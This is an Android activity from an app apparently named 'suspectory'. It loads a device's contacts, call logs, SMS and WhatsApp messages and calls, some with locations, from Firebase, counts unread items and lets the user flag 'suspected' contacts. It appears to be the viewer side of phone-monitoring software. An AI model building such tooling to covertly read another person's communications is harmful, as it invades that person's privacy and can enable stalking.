package com.aftab.suspectory.Activities.Main;

import android.app.Dialog;
import android.content.Context;
import android.graphics.drawable.ColorDrawable;
import android.os.Bundle;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.appcompat.widget.Toolbar;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.aftab.suspectory.Adapter.Recyclerview.AllContactsAdapter;
import com.aftab.suspectory.Model.CallLogs;
import com.aftab.suspectory.Model.Chat;
import com.aftab.suspectory.Model.Contacts;
import com.aftab.suspectory.Model.SimSMS;
import com.aftab.suspectory.Model.WhatsAppMessage;
import com.aftab.suspectory.Model.WhatsappCallLogs;
import com.aftab.suspectory.R;
import com.aftab.suspectory.Utills.Constants;
import com.aftab.suspectory.Utills.FireRef;
import com.aftab.suspectory.Utills.Functions;
import com.aftab.suspectory.Utills.SharedPref;
import com.airbnb.lottie.LottieAnimationView;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.ValueEventListener;
import com.l4digital.fastscroll.FastScrollRecyclerView;
import com.miguelcatalan.materialsearchview.MaterialSearchView;

import java.util.ArrayList;
import java.util.Collections;
import java.util.Objects;

public class AllContactsActivity extends AppCompatActivity {

    Context context;
    FastScrollRecyclerView rvAllContacts;
    ArrayList<Contacts> contactsList = new ArrayList<>();
    ArrayList<Contacts> filteredContactsList = new ArrayList<>();
    AllContactsAdapter allContactsAdapter;
    MaterialSearchView simpleSearchView;
    Toolbar toolbar;
    String userDeviceId;
    SharedPref sh;
    LottieAnimationView lavNoData;
    int mainCount = 0, whatsappCount = 0, callLogsCount = 0, simCount = 0, waCount = 0, wvCount;
    long lastWhatsappMilli, lastCallMilli, lastSimMilli;
    long lastDate;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_all_contacts);
        initUI();

        getAllContacts();
        searchListener();


    }


    private void initUI() {
        context = AllContactsActivity.this;
        sh = new SharedPref(context);
        toolbar = findViewById(R.id.toolbar);
        rvAllContacts = findViewById(R.id.rv_all_contacts);
        simpleSearchView = findViewById(R.id.search_view);
        lavNoData = findViewById(R.id.lav_no_data);


        setSupportActionBar(toolbar);
        toolbar.setNavigationOnClickListener(v -> onBackPressed());


        userDeviceId = sh.getString(Constants.DEVICE_ID);
    }


    private void getAllContacts() {

        Functions.loadingDialog(context, "Loading", true);

        FireRef.CONTACTS.child(userDeviceId)
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        contactsList.clear();
                        mainCount = whatsappCount = callLogsCount = simCount = 0;

                        for (DataSnapshot dataSnapshot : snapshot.getChildren()) {

                            Contacts contacts = dataSnapshot.getValue(Contacts.class);

                            assert contacts != null;

                            String name = contacts.getName();

                            if (!name.matches("[0-9]+") && name.length() > 2)
                                contactsList.add(contacts);


                        }


                        if (contactsList.size() > 0) {

                            lavNoData.setVisibility(View.GONE);

                        } else {

                            lavNoData.setVisibility(View.VISIBLE);

                        }


                        if (contactsList.size() > 0) {

                            mainCount = 0;
                            getCallLogsCount();

                        } else {

                            setAdapter();

                        }


                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                    }
                });

    }

    private void setAdapter() {

        Collections.sort(contactsList, (o1, o2) -> o2.getLastMsgDate().compareTo(o1.getLastMsgDate()));
        rvAllContacts.setLayoutManager(new LinearLayoutManager(context, RecyclerView.VERTICAL, false));

        allContactsAdapter = new AllContactsAdapter(context, contactsList, this::openAddToSuspectedDialog);
        rvAllContacts.setAdapter(allContactsAdapter);

        Functions.loadingDialog(context, "Loading", false);


    }

    private void getCallLogsCount() {

        FireRef.CALL_LOGS.child(userDeviceId).child(contactsList.get(mainCount).getNumber().trim()).keepSynced(true);

        FireRef.CALL_LOGS.child(userDeviceId)
                .child(contactsList.get(mainCount).getNumber().trim())
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        callLogsCount = 0;
                        lastCallMilli = 0;

                        for (DataSnapshot dataSnapshot : snapshot.getChildren()) {

                            CallLogs callLogs = dataSnapshot.getValue(CallLogs.class);

                            assert callLogs != null;
                            Chat chat = new Chat(callLogs.getId(), "", callLogs.getCallDate(),
                                    callLogs.getCallType(), callLogs.getCallDuration(), "", "", "", callLogs.isRead());


                            if (!chat.getIsRead()) {

                                callLogsCount++;

                            }


                            lastCallMilli = Long.parseLong(chat.getTime());

                            if (lastCallMilli < Long.parseLong(chat.getTime())) {

                                lastCallMilli = Long.parseLong(chat.getTime());

                            }

                            lastDate = 0;

                            if (contactsList.get(mainCount).getLastMsgDate() == null) {

                                contactsList.get(mainCount).setLastMsgDate(chat.getTime());


                            }

                            lastDate = Long.parseLong(contactsList.get(mainCount).getLastMsgDate());

                            if (lastDate != 0) {

                                if (lastDate > Long.parseLong(chat.getTime())) {

                                    contactsList.get(mainCount).setLastMsgDate(lastDate + "");

                                }

                            } else {

                                contactsList.get(mainCount).setLastMsgDate("0");

                            }

                        }

                        if (contactsList.get(mainCount).getLastMsgDate() == null) {

                            contactsList.get(mainCount).setLastMsgDate("0");


                        }

                        getSIMSMS();


                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                        Functions.loadingDialog(context, "Loading", false);
                        Functions.showSnackBar(context, error.getMessage());
                    }
                });

    }

    private void getSIMSMS() {

        FireRef.SIM_SMS.child(userDeviceId).child(contactsList.get(mainCount).getNumber().trim()).keepSynced(true);


        FireRef.SIM_SMS.child(userDeviceId)
                .child(contactsList.get(mainCount).getNumber().trim())
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        simCount = 0;
                        lastSimMilli = 0;


                        for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                            SimSMS simSMS = dataSnapshot.getValue(SimSMS.class);

                            assert simSMS != null;
                            Chat chat = new Chat(simSMS.getId(), simSMS.getMsg(), simSMS.getTime(), simSMS.getType()
                                    , "", "", simSMS.getLocation(), "", simSMS.isRead());

                            if (!chat.getIsRead()) {

                                simCount++;

                            }


                            lastSimMilli = Long.parseLong(chat.getTime());

                            if (lastSimMilli < Long.parseLong(chat.getTime())) {

                                lastSimMilli = Long.parseLong(chat.getTime());

                            }

                            lastDate = 0;

                            if (contactsList.get(mainCount).getLastMsgDate() == null) {

                                contactsList.get(mainCount).setLastMsgDate(chat.getTime());


                            }

                            lastDate = Long.parseLong(contactsList.get(mainCount).getLastMsgDate());

                            if (lastDate != 0) {

                                if (lastDate > Long.parseLong(chat.getTime())) {

                                    contactsList.get(mainCount).setLastMsgDate(lastDate + "");

                                }
                            } else {

                                contactsList.get(mainCount).setLastMsgDate("0");

                            }
                        }
                        if (contactsList.get(mainCount).getLastMsgDate() == null) {

                            contactsList.get(mainCount).setLastMsgDate("0");


                        }

                        getWhatsappWALog();


                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                        Functions.loadingDialog(context, "Loading", false);
                        Functions.showSnackBar(context, error.getMessage());
                    }
                });
    }

    private void getWhatsappWALog() {

        FireRef.WhATSAPP_A_CALL_LOG.child(userDeviceId).child(contactsList.get(mainCount).getNumber().trim()).keepSynced(true);


        FireRef.WhATSAPP_A_CALL_LOG.child(userDeviceId)
                .child(contactsList.get(mainCount).getNumber().trim())
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        waCount = 0;
                        lastSimMilli = 0;

                        for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                            WhatsappCallLogs whatsappCallLogs = dataSnapshot.getValue(WhatsappCallLogs.class);

                            assert whatsappCallLogs != null;
                            Chat chat = new Chat(whatsappCallLogs.getId(), "", whatsappCallLogs.getCallDate(),
                                    whatsappCallLogs.getCallType(), whatsappCallLogs.getCallDuration(), "",
                                    whatsappCallLogs.getLocation(), whatsappCallLogs.getUrl(), whatsappCallLogs.isRead());

                            if (!chat.getIsRead()) {

                                waCount++;

                            }


                            lastSimMilli = Long.parseLong(chat.getTime());

                            if (lastSimMilli < Long.parseLong(chat.getTime())) {

                                lastSimMilli = Long.parseLong(chat.getTime());

                            }


                            lastDate = 0;

                            if (contactsList.get(mainCount).getLastMsgDate() == null) {

                                contactsList.get(mainCount).setLastMsgDate(chat.getTime());


                            }

                            lastDate = Long.parseLong(contactsList.get(mainCount).getLastMsgDate());

                            if (lastDate != 0) {

                                if (lastDate > Long.parseLong(chat.getTime())) {

                                    contactsList.get(mainCount).setLastMsgDate(lastDate + "");

                                }
                            } else {

                                contactsList.get(mainCount).setLastMsgDate("0");

                            }
                        }
                        if (contactsList.get(mainCount).getLastMsgDate() == null) {

                            contactsList.get(mainCount).setLastMsgDate("0");


                        }

                        getWhatsappWVLog();


                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                        Functions.loadingDialog(context, "Loading", false);
                        Functions.showSnackBar(context, error.getMessage());
                    }
                });

    }

    private void getWhatsappWVLog() {

        FireRef.WhATSAPP_V_CALL_LOG.child(userDeviceId).child(contactsList.get(mainCount).getNumber().trim()).keepSynced(true);


        FireRef.WhATSAPP_V_CALL_LOG.child(userDeviceId)
                .child(contactsList.get(mainCount).getNumber().trim())
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        wvCount = 0;
                        lastSimMilli = 0;


                        for (DataSnapshot dataSnapshot : snapshot.getChildren()) {
                            WhatsappCallLogs whatsappCallLogs = dataSnapshot.getValue(WhatsappCallLogs.class);

                            assert whatsappCallLogs != null;
                            Chat chat = new Chat(whatsappCallLogs.getId(), "", whatsappCallLogs.getCallDate(),
                                    whatsappCallLogs.getCallType(), whatsappCallLogs.getCallDuration(), "",
                                    whatsappCallLogs.getLocation(), whatsappCallLogs.getUrl(), whatsappCallLogs.isRead());

                            if (!chat.getIsRead()) {

                                wvCount++;

                            }


                            lastSimMilli = Long.parseLong(chat.getTime());

                            if (lastSimMilli < Long.parseLong(chat.getTime())) {

                                lastSimMilli = Long.parseLong(chat.getTime());

                            }


                            lastDate = 0;

                            if (contactsList.get(mainCount).getLastMsgDate() == null) {

                                contactsList.get(mainCount).setLastMsgDate(chat.getTime());


                            }

                            lastDate = Long.parseLong(contactsList.get(mainCount).getLastMsgDate());

                            if (lastDate != 0) {

                                if (lastDate > Long.parseLong(chat.getTime())) {

                                    contactsList.get(mainCount).setLastMsgDate(lastDate + "");

                                }
                            } else {

                                contactsList.get(mainCount).setLastMsgDate("0");

                            }

                        }

                        if (contactsList.get(mainCount).getLastMsgDate() == null) {

                            contactsList.get(mainCount).setLastMsgDate("0");


                        }
                        getWhatsappMessage();


                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                        Functions.loadingDialog(context, "Loading", false);
                        Functions.showSnackBar(context, error.getMessage());
                    }
                });
    }

    private void getWhatsappMessage() {

        FireRef.WhATSAPP_MESSAGE.child(userDeviceId).child(contactsList.get(mainCount).getNumber().trim()).keepSynced(true);

        FireRef.WhATSAPP_MESSAGE.child(userDeviceId)
                .child(contactsList.get(mainCount).getNumber().trim())
                .addListenerForSingleValueEvent(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {

                        whatsappCount = 0;
                        lastWhatsappMilli = 0;


                        for (DataSnapshot dataSnapshot : snapshot.getChildren()) {

                            WhatsAppMessage whatsAppMessage = dataSnapshot.getValue(WhatsAppMessage.class);

                            assert whatsAppMessage != null;
                            Chat chat = new Chat(whatsAppMessage.getId(), whatsAppMessage.getMsg(), whatsAppMessage.getTime()
                                    , whatsAppMessage.getType(), "", "", whatsAppMessage.getLocation(), "", whatsAppMessage.isRead());


                            if (!chat.getIsRead()) {

                                whatsappCount++;

                            }


                            lastWhatsappMilli = Long.parseLong(chat.getTime());

                            if (lastWhatsappMilli < Long.parseLong(chat.getTime())) {

                                lastWhatsappMilli = Long.parseLong(chat.getTime());

                            }

                            lastDate = 0;

                            if (contactsList.get(mainCount).getLastMsgDate() == null) {

                                contactsList.get(mainCount).setLastMsgDate(chat.getTime());


                            }

                            lastDate = Long.parseLong(contactsList.get(mainCount).getLastMsgDate());

                            if (lastDate != 0) {

                                if (lastDate > Long.parseLong(chat.getTime())) {

                                    contactsList.get(mainCount).setLastMsgDate(lastDate + "");

                                }
                            } else {

                                contactsList.get(mainCount).setLastMsgDate("0");

                            }
                        }
                        if (contactsList.get(mainCount).getLastMsgDate() == null) {

                            contactsList.get(mainCount).setLastMsgDate("0");


                        }

                        mainCount++;


                        if (mainCount <= contactsList.size()) {


                            long lastTimeNoti;

                            int finalCount;
                            finalCount = callLogsCount + simCount + whatsappCount;

                            if (finalCount > 99) {

                                contactsList.get(mainCount - 1).setUnReadCount("99+");


                            } else {

                                contactsList.get(mainCount - 1).setUnReadCount(finalCount + "");

                            }

                            lastTimeNoti = Math.max(lastSimMilli, lastCallMilli);

                            contactsList.get(mainCount - 1).setLastNoti(lastTimeNoti + "");


                            if (mainCount < contactsList.size()) {

                                getCallLogsCount();

                            } else {

                                //  rvAllContacts.setLayoutManager(new LinearLayoutManager(context, RecyclerView.VERTICAL, false));

                                setAdapter();

                            }

                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {

                        Functions.loadingDialog(context, "Loading", false);
                        Functions.showSnackBar(context, error.getMessage());
                    }
                });
    }


    public void openSearch(View view) {

        simpleSearchView.showSearch();

    }

    private void searchListener() {

        simpleSearchView.setOnQueryTextListener(new MaterialSearchView.OnQueryTextListener() {
            @Override
            public boolean onQueryTextSubmit(String query) {
                //Do some magic
                return false;
            }

            @Override
            public boolean onQueryTextChange(String search) {

                filteredContactsList.clear();

                if (!search.equals("")) {

                    for (Contacts contacts : contactsList) {

                        String name = contacts.getName().toLowerCase();

                        if (name.contains(search)) {

                            filteredContactsList.add(contacts);

                        }
                        //something here
                    }
                    allContactsAdapter = new AllContactsAdapter(context, filteredContactsList, contacts -> openAddToSuspectedDialog(contacts));
                    // intentList.contains(search);


                    if (filteredContactsList.size() > 0) {

                        lavNoData.setVisibility(View.GONE);

                    } else {

                        lavNoData.setVisibility(View.VISIBLE);

                    }
                } else {

                    if (contactsList.size() > 0) {

                        lavNoData.setVisibility(View.GONE);

                    } else {

                        lavNoData.setVisibility(View.VISIBLE);

                    }

                    allContactsAdapter = new AllContactsAdapter(context, contactsList, contacts -> openAddToSuspectedDialog(contacts));

                }

                rvAllContacts.setAdapter(allContactsAdapter);


                return false;
            }
        });

    }

    private void openAddToSuspectedDialog(Contacts contacts) {

        Dialog dialog = new Dialog(context);
        dialog.setContentView(R.layout.add_suspected_dialog);
        dialog.setCancelable(false);
        Objects.requireNonNull(dialog.getWindow()).setBackgroundDrawable(new ColorDrawable(android.graphics.Color.TRANSPARENT));
        Button btnAdd = dialog.findViewById(R.id.btn_yes);
        Button btnCancel = dialog.findViewById(R.id.btn_cancel);


        btnCancel.setOnClickListener(v -> dialog.dismiss());

        btnAdd.setOnClickListener(v -> {

            dialog.dismiss();
            addToSuspectedContacts(contacts);

        });


        dialog.getWindow().setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        dialog.show();
    }

    private void addToSuspectedContacts(Contacts contacts) {

        Functions.loadingDialog(context, "Adding", true);

        FireRef.SUSPECTED_CONTACTS
                .child(userDeviceId)
                .child(contacts.getNumber())
                .setValue(contacts)
                .addOnCompleteListener(task -> {

                    Functions.loadingDialog(context, "Adding", false);
                    Functions.showSnackBar(context, "Added Successfully");


                }).addOnFailureListener(e -> {

            Functions.loadingDialog(context, "Adding", false);
            Functions.showSnackBar(context, e.getMessage());

        });

    }


}